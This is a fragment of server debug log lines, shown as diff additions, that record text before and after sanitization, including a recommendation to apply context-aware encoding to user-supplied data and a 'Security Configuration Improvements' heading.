+2025-08-04 19:51:23,840 - server - DEBUG - Raw text before sanitization: Recommendation:**  Encode all user-supplied data before displaying it on a webpage.  Use context-aware encoding:
+2025-08-04 19:51:23,840 - server - DEBUG - Sanitized text: Recommendation:**  Encode all user-supplied data before displaying it on a webpage.  Use context-aware encoding:
+2025-08-04 19:51:23,840 - server - DEBUG - Raw text before sanitization: Security Configuration Improvements:**
+2025-08-04 19:51:23,842 - server - DEBUG - Sanitized text: Security Configuration Improvements:**
